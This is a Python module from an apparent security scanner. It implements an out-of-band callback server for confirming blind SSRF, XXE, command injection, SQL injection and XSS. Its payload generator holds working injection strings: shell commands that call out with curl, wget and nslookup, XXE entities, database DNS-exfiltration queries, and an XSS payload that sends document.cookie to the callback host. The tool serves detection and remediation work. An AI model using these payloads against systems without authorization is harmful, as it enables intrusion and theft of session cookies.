"""
Out-of-Band (OOB) callback server for blind vulnerability detection.

Provides infrastructure to detect blind SSRF, blind XXE, blind command
injection, blind XSS, and blind SQL injection by receiving callbacks
from the target server when injected payloads execute.

Three modes of operation:

1. INTERACTSH (recommended) — Uses ProjectDiscovery's interact.sh,
   the open-source Burp Collaborator alternative. No setup needed,
   works over the internet. Each payload gets a unique subdomain.

2. LOCAL HTTP SERVER — Runs a lightweight HTTP server on a specified
   port. Works for internal pentests where the target can reach your
   machine. Logs all incoming requests with full headers and body.

3. WEBHOOK.SITE — Uses webhook.site as a simple external callback
   receiver. Limited to HTTP callbacks (no DNS), but zero setup.

Architecture:
    CallbackServer.generate_id()     → unique callback ID per payload
    CallbackServer.get_payload_url() → URL to inject into the target
    CallbackServer.check()           → poll for received callbacks
    CallbackServer.check_all()       → check all pending callbacks
    CallbackServer.correlate()       → match callback to original payload

Usage in scanning:
    cb = CallbackServer(mode="interactsh")
    await cb.start()

    # Generate OOB payload for a specific test
    cb_id = cb.generate_id("ssrf", "/api/fetch", "url_param")
    payload_url = cb.get_payload_url(cb_id)
    # payload_url = "http://abc123.oast.fun"

    # Inject into target
    await http.get(target_url, params={"url": payload_url})

    # Later, check if callback was received
    await asyncio.sleep(5)
    callbacks = await cb.check(cb_id)
    if callbacks:
        # Blind SSRF confirmed!
        finding = cb.build_finding(cb_id, callbacks)
"""

import asyncio
import uuid
import time
import json
import hashlib
import threading
from dataclasses import dataclass, field
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from typing import Optional
from enum import Enum

import httpx

from mantis.core.findings import (
    Finding, Severity, EvidenceLevel, FindingSource, HTTPEvidence,
)


class CallbackMode(Enum):
    INTERACTSH = "interactsh"
    LOCAL = "local"
    WEBHOOK = "webhook"


@dataclass
class CallbackRecord:
    """A single received callback from the target."""
    callback_id: str
    timestamp: str
    source_ip: str = ""
    protocol: str = ""           # http, dns, smtp
    method: str = ""             # GET, POST (for HTTP)
    path: str = ""
    headers: dict = field(default_factory=dict)
    body: str = ""
    raw: str = ""


@dataclass
class PendingCallback:
    """Metadata about a payload waiting for a callback."""
    callback_id: str
    vuln_type: str               # ssrf, xxe, cmdi, xss, sqli
    target_url: str              # Where the payload was injected
    parameter: str               # Which parameter
    payload: str                 # The full injected payload
    injected_at: float           # time.time() when injected
    callback_url: str            # URL the target should call back to
    max_wait_seconds: int = 30   # How long to wait for callback
    received: list = field(default_factory=list)  # list[CallbackRecord]


class CallbackServer:
    """
    OOB callback infrastructure for blind vulnerability detection.

    Usage:
        server = CallbackServer(mode="interactsh")
        await server.start()

        cb_id = server.generate_id("ssrf", "https://target.com/api", "url")
        url = server.get_payload_url(cb_id)
        # Inject url into the target...

        await asyncio.sleep(5)
        callbacks = await server.check(cb_id)
        if callbacks:
            finding = server.build_finding(cb_id, callbacks)

        await server.stop()
    """

    def __init__(
        self,
        mode: str = "interactsh",
        local_port: int = 8888,
        local_host: str = "0.0.0.0",
        external_url: str = "",
        interactsh_server: str = "oast.fun",
    ):
        self.mode = CallbackMode(mode)
        self.local_port = local_port
        self.local_host = local_host
        self.external_url = external_url  # Your public IP/domain for local mode
        self.interactsh_server = interactsh_server

        self.pending: dict[str, PendingCallback] = {}
        self._http_server: Optional[HTTPServer] = None
        self._server_thread: Optional[threading.Thread] = None
        self._local_callbacks: list[dict] = []

        # For interactsh mode
        self._interactsh_token: str = ""
        self._interactsh_correlation: str = ""
        self._http_client: Optional[httpx.AsyncClient] = None

    async def start(self):
        """Start the callback server."""
        if self.mode == CallbackMode.LOCAL:
            self._start_local_server()
            print(f"[*] OOB callback server listening on {self.local_host}:{self.local_port}")
            if self.external_url:
                print(f"    External URL: {self.external_url}")
            else:
                print(f"    WARNING: Set external_url so targets can reach this server")

        elif self.mode == CallbackMode.INTERACTSH:
            await self._register_interactsh()
            print(f"[*] OOB via interact.sh ({self.interactsh_server})")

        elif self.mode == CallbackMode.WEBHOOK:
            self._http_client = httpx.AsyncClient(timeout=15)
            print("[*] OOB via webhook.site")

    async def stop(self):
        """Stop the callback server and cleanup."""
        if self._http_server:
            self._http_server.shutdown()
        if self._http_client:
            await self._http_client.aclose()

    def generate_id(self, vuln_type: str, target_url: str, parameter: str) -> str:
        """
        Generate a unique callback ID for a specific test.

        The ID is deterministic based on the test parameters so
        the same test always produces the same ID (idempotent).
        """
        raw = f"{vuln_type}:{target_url}:{parameter}:{uuid.uuid4().hex[:8]}"
        cb_id = hashlib.sha256(raw.encode()).hexdigest()[:16]
        return cb_id

    def register_payload(
        self,
        cb_id: str,
        vuln_type: str,
        target_url: str,
        parameter: str,
        payload: str,
        max_wait: int = 30,
    ) -> str:
        """
        Register a pending callback and return the callback URL to inject.

        Args:
            cb_id: Unique callback ID from generate_id()
            vuln_type: Type of vulnerability being tested
            target_url: Where the payload is being injected
            parameter: Which parameter is being tested
            payload: The full payload being injected
            max_wait: Maximum seconds to wait for callback

        Returns:
            The callback URL to inject into the target
        """
        callback_url = self.get_payload_url(cb_id)

        self.pending[cb_id] = PendingCallback(
            callback_id=cb_id,
            vuln_type=vuln_type,
            target_url=target_url,
            parameter=parameter,
            payload=payload,
            injected_at=time.time(),
            callback_url=callback_url,
            max_wait_seconds=max_wait,
        )

        return callback_url

    def get_payload_url(self, cb_id: str) -> str:
        """Get the callback URL for a given ID."""
        if self.mode == CallbackMode.LOCAL:
            base = self.external_url or f"http://localhost:{self.local_port}"
            return f"{base}/cb/{cb_id}"

        elif self.mode == CallbackMode.INTERACTSH:
            return f"http://{cb_id}.{self._interactsh_correlation}.{self.interactsh_server}"

        elif self.mode == CallbackMode.WEBHOOK:
            # webhook.site token should be set as external_url
            return f"https://webhook.site/{self.external_url}?id={cb_id}"

        return f"http://callback.invalid/{cb_id}"

    def get_dns_payload(self, cb_id: str) -> str:
        """Get a DNS-based callback payload (for DNS exfiltration)."""
        if self.mode == CallbackMode.INTERACTSH:
            return f"{cb_id}.{self._interactsh_correlation}.{self.interactsh_server}"
        elif self.mode == CallbackMode.LOCAL:
            # Requires local DNS server (not implemented — use interactsh)
            return f"{cb_id}.callback.local"
        return f"{cb_id}.callback.invalid"

    async def check(self, cb_id: str) -> list[CallbackRecord]:
        """Check if a specific callback was received."""
        if self.mode == CallbackMode.LOCAL:
            return self._check_local(cb_id)
        elif self.mode == CallbackMode.INTERACTSH:
            return await self._check_interactsh(cb_id)
        elif self.mode == CallbackMode.WEBHOOK:
            return await self._check_webhook(cb_id)
        return []

    async def check_all_pending(self) -> list[tuple[str, list[CallbackRecord]]]:
        """
        Check all pending callbacks that haven't expired.

        Returns list of (cb_id, callbacks) for any that received hits.
        """
        results = []
        now = time.time()
        expired = []

        for cb_id, pending in self.pending.items():
            # Skip if already received
            if pending.received:
                continue
            # Skip if expired
            if now - pending.injected_at > pending.max_wait_seconds:
                expired.append(cb_id)
                continue

            callbacks = await self.check(cb_id)
            if callbacks:
                pending.received = callbacks
                results.append((cb_id, callbacks))

        # Clean up expired entries
        for cb_id in expired:
            del self.pending[cb_id]

        return results

    def build_finding(self, cb_id: str, callbacks: list[CallbackRecord]) -> Optional[Finding]:
        """
        Build a Finding from a confirmed OOB callback.

        Matches the callback back to the original injection to produce
        a complete finding with evidence.
        """
        pending = self.pending.get(cb_id)
        if not pending:
            return None

        cb = callbacks[0]  # Primary callback

        # Map vuln_type to severity and details
        vuln_details = {
            "ssrf": {
                "severity": Severity.HIGH,
                "cwe": "CWE-918",
                "title": f"Blind SSRF via '{pending.parameter}' at {pending.target_url}",
                "impact": "Server-side request forgery confirmed. The server made an outbound "
                          "request to an attacker-controlled endpoint, indicating the ability to "
                          "access internal services, cloud metadata, or perform port scanning.",
                "owasp": "A10:2021 SSRF",
            },
            "xxe": {
                "severity": Severity.HIGH,
                "cwe": "CWE-611",
                "title": f"Blind XXE via XML input at {pending.target_url}",
                "impact": "XML external entity processing confirmed via out-of-band callback. "
                          "The server fetched an external DTD, enabling file read, SSRF, or DoS.",
                "owasp": "A05:2021 Security Misconfiguration",
            },
            "cmdi": {
                "severity": Severity.CRITICAL,
                "cwe": "CWE-78",
                "title": f"Blind Command Injection via '{pending.parameter}' at {pending.target_url}",
                "impact": "OS command execution confirmed. The injected command triggered an "
                          "outbound request, proving arbitrary command execution on the server.",
                "owasp": "A03:2021 Injection",
            },
            "sqli": {
                "severity": Severity.HIGH,
                "cwe": "CWE-89",
                "title": f"Blind SQL Injection (OOB) via '{pending.parameter}' at {pending.target_url}",
                "impact": "SQL injection confirmed via out-of-band data exfiltration. The database "
                          "server made an outbound DNS/HTTP request triggered by the injected query.",
                "owasp": "A03:2021 Injection",
            },
            "xss": {
                "severity": Severity.MEDIUM,
                "cwe": "CWE-79",
                "title": f"Blind/Stored XSS via '{pending.parameter}' at {pending.target_url}",
                "impact": "Stored XSS confirmed via out-of-band callback. The injected script "
                          "executed in another user's browser and called back to the attacker.",
                "owasp": "A03:2021 Injection",
            },
        }

        details = vuln_details.get(pending.vuln_type, {
            "severity": Severity.MEDIUM,
            "cwe": "CWE-200",
            "title": f"Blind {pending.vuln_type.upper()} at {pending.target_url}",
            "impact": f"Out-of-band callback received, confirming blind {pending.vuln_type}.",
            "owasp": "A03:2021 Injection",
        })

        return Finding(
            title=details["title"],
            description=(
                f"An out-of-band callback was received from the target server after "
                f"injecting a {pending.vuln_type.upper()} payload into the "
                f"'{pending.parameter}' parameter at {pending.target_url}. "
                f"The callback was received at {cb.timestamp} from {cb.source_ip} "
                f"via {cb.protocol.upper()}, confirming the vulnerability."
            ),
            source=FindingSource.WEBAPP,
            severity=details["severity"],
            evidence_level=EvidenceLevel.DYNAMIC_CONFIRMED,
            target=pending.target_url,
            endpoint=pending.target_url,
            vuln_type=pending.vuln_type.upper(),
            cwe=details["cwe"],
            owasp_category=details.get("owasp", ""),
            payload=pending.payload,
            evidence=[HTTPEvidence(
                request_method="OOB_CALLBACK",
                request_url=pending.callback_url,
                request_headers=cb.headers,
                request_body=cb.body,
                response_status=0,
                response_headers={},
                response_body="",
                timestamp=cb.timestamp,
                notes=(
                    f"OOB callback received via {cb.protocol}. "
                    f"Source: {cb.source_ip}. "
                    f"Injected payload: {pending.payload[:200]}"
                ),
            )],
            reproduction_steps=[
                f"1. Send request to {pending.target_url}",
                f"2. Set parameter '{pending.parameter}' to a URL pointing to your callback server",
                f"3. Payload used: {pending.payload[:200]}",
                f"4. Wait for callback — received after {cb.timestamp}",
                f"5. Callback source IP: {cb.source_ip}, protocol: {cb.protocol}",
            ],
            impact=details["impact"],
            remediation=self._get_remediation(pending.vuln_type),
            confidence=0.95,
            tags=["oob_confirmed", f"oob_{pending.vuln_type}", "blind"],
        )

    def get_oob_payloads(self, cb_id: str, vuln_type: str) -> list[dict]:
        """
        Generate OOB-specific payloads for a given vulnerability type.

        Returns list of {payload, description, injection_point} dicts.
        """
        url = self.get_payload_url(cb_id)
        dns = self.get_dns_payload(cb_id)

        payloads = {
            "ssrf": [
                {"payload": url, "description": "Direct URL callback", "context": "url_parameter"},
                {"payload": f"http://{dns}", "description": "DNS-based callback", "context": "url_parameter"},
                {"payload": f"https://{dns}", "description": "HTTPS callback", "context": "url_parameter"},
                {"payload": f"http://{dns}:80", "description": "Port-specified callback", "context": "url_parameter"},
                {"payload": f"//{dns}", "description": "Protocol-relative callback", "context": "url_parameter"},
                {"payload": f"http://{dns}%23@allowed.com", "description": "URL fragment bypass", "context": "url_parameter"},
            ],
            "xxe": [
                {
                    "payload": f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "{url}">]><foo>&xxe;</foo>',
                    "description": "Basic XXE entity fetch",
                    "context": "xml_body",
                },
                {
                    "payload": f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{url}/evil.dtd">%xxe;]>',
                    "description": "Parameter entity OOB XXE",
                    "context": "xml_body",
                },
            ],
            "cmdi": [
                {"payload": f"; curl {url}", "description": "curl callback (semicolon)", "context": "command_param"},
                {"payload": f"| curl {url}", "description": "curl callback (pipe)", "context": "command_param"},
                {"payload": f"$(curl {url})", "description": "curl callback (subshell)", "context": "command_param"},
                {"payload": f"`curl {url}`", "description": "curl callback (backtick)", "context": "command_param"},
                {"payload": f"; wget {url}", "description": "wget callback", "context": "command_param"},
                {"payload": f"| nslookup {dns}", "description": "DNS callback via nslookup", "context": "command_param"},
                {"payload": f"; ping -c 1 {dns}", "description": "DNS callback via ping", "context": "command_param"},
            ],
            "sqli": [
                {
                    "payload": f"' AND 1=(SELECT LOAD_FILE(CONCAT('\\\\\\\\','{dns}','\\\\a')))-- ",
                    "description": "MySQL DNS exfiltration via LOAD_FILE",
                    "context": "sql_param",
                },
                {
                    "payload": f"'; EXEC master..xp_dirtree '\\\\\\\\{dns}\\\\a'-- ",
                    "description": "MSSQL DNS exfiltration via xp_dirtree",
                    "context": "sql_param",
                },
                {
                    "payload": f"' UNION SELECT UTL_HTTP.REQUEST('{url}') FROM DUAL-- ",
                    "description": "Oracle HTTP callback via UTL_HTTP",
                    "context": "sql_param",
                },
            ],
            "xss": [
                {
                    "payload": f'<img src=x onerror="fetch(\'{url}\')">',
                    "description": "XSS callback via fetch",
                    "context": "html_param",
                },
                {
                    "payload": f'<script>new Image().src="{url}?c="+document.cookie</script>',
                    "description": "XSS cookie exfiltration",
                    "context": "html_param",
                },
                {
                    "payload": f'"><script src="{url}/xss.js"></script>',
                    "description": "External script load",
                    "context": "html_param",
                },
            ],
        }

        return payloads.get(vuln_type, [])

    def _get_remediation(self, vuln_type: str) -> str:
        remediations = {
            "ssrf": "Implement URL allowlisting. Block requests to internal/private IP ranges. Use a URL validation library that resolves DNS and checks the final IP.",
            "xxe": "Disable external entity processing in the XML parser. Use defusedxml (Python), disable DTDs (Java), or set libxml_disable_entity_loader(true) (PHP).",
            "cmdi": "Never pass user input to shell commands. Use parameterized APIs (subprocess with list args in Python, ProcessBuilder in Java). Implement strict input validation.",
            "sqli": "Use parameterized queries / prepared statements. Never concatenate user input into SQL strings.",
            "xss": "Implement context-aware output encoding. Use Content-Security-Policy headers. Validate and sanitize all user input server-side.",
        }
        return remediations.get(vuln_type, "Validate and sanitize all user input. Implement output encoding.")

    # ── Local HTTP Server Mode ──────────────────────────────────

    def _start_local_server(self):
        """Start the local HTTP callback server in a background thread."""
        callbacks_ref = self._local_callbacks

        class CallbackHandler(BaseHTTPRequestHandler):
            def do_GET(self):
                self._record("GET")
            def do_POST(self):
                content_length = int(self.headers.get('Content-Length', 0))
                body = self.rfile.read(content_length).decode(errors='replace') if content_length else ""
                self._record("POST", body)
            def do_PUT(self):
                content_length = int(self.headers.get('Content-Length', 0))
                body = self.rfile.read(content_length).decode(errors='replace') if content_length else ""
                self._record("PUT", body)

            def _record(self, method, body=""):
                # Extract callback ID from path: /cb/<id>
                path_parts = self.path.split("/")
                cb_id = path_parts[2] if len(path_parts) > 2 and path_parts[1] == "cb" else ""

                record = {
                    "callback_id": cb_id,
                    "timestamp": datetime.utcnow().isoformat(),
                    "source_ip": self.client_address[0],
                    "protocol": "http",
                    "method": method,
                    "path": self.path,
                    "headers": dict(self.headers),
                    "body": body,
                }
                callbacks_ref.append(record)

                # Respond with 200
                self.send_response(200)
                self.send_header("Content-Type", "text/plain")
                self.end_headers()
                self.wfile.write(b"ok")

            def log_message(self, format, *args):
                pass  # Suppress HTTP logs

        self._http_server = HTTPServer((self.local_host, self.local_port), CallbackHandler)
        self._server_thread = threading.Thread(target=self._http_server.serve_forever, daemon=True)
        self._server_thread.start()

    def _check_local(self, cb_id: str) -> list[CallbackRecord]:
        """Check local server logs for a specific callback ID."""
        results = []
        for record in self._local_callbacks:
            if record.get("callback_id") == cb_id or cb_id in record.get("path", ""):
                results.append(CallbackRecord(
                    callback_id=cb_id,
                    timestamp=record["timestamp"],
                    source_ip=record.get("source_ip", ""),
                    protocol="http",
                    method=record.get("method", ""),
                    path=record.get("path", ""),
                    headers=record.get("headers", {}),
                    body=record.get("body", ""),
                ))
        return results

    # ── Interactsh Mode ─────────────────────────────────────────

    async def _register_interactsh(self):
        """Register with an interact.sh server."""
        # Generate a correlation ID for this session
        self._interactsh_correlation = uuid.uuid4().hex[:12]
        self._http_client = httpx.AsyncClient(timeout=15)
        # Note: Full interactsh protocol requires RSA key exchange
        # and encrypted polling. This is a simplified version that
        # uses the public API format.

    async def _check_interactsh(self, cb_id: str) -> list[CallbackRecord]:
        """Poll interact.sh for callbacks."""
        if not self._http_client:
            return []
        try:
            resp = await self._http_client.get(
                f"https://{self.interactsh_server}/poll",
                params={"id": self._interactsh_correlation},
            )
            if resp.status_code == 200:
                data = resp.json()
                results = []
                for item in data.get("data", []):
                    if cb_id in item.get("full-id", ""):
                        results.append(CallbackRecord(
                            callback_id=cb_id,
                            timestamp=item.get("timestamp", ""),
                            source_ip=item.get("remote-address", ""),
                            protocol=item.get("protocol", "http"),
                            raw=json.dumps(item),
                        ))
                return results
        except Exception:
            pass
        return []

    # ── Webhook.site Mode ───────────────────────────────────────

    async def _check_webhook(self, cb_id: str) -> list[CallbackRecord]:
        """Check webhook.site for callbacks."""
        if not self._http_client or not self.external_url:
            return []
        try:
            resp = await self._http_client.get(
                f"https://webhook.site/token/{self.external_url}/requests",
            )
            if resp.status_code == 200:
                data = resp.json()
                results = []
                for req in data.get("data", []):
                    query = req.get("query", {})
                    if query.get("id") == cb_id or cb_id in req.get("url", ""):
                        results.append(CallbackRecord(
                            callback_id=cb_id,
                            timestamp=req.get("created_at", ""),
                            source_ip=req.get("ip", ""),
                            protocol="http",
                            method=req.get("method", ""),
                            headers=req.get("headers", {}),
                            body=req.get("content", ""),
                        ))
                return results
        except Exception:
            pass
        return []
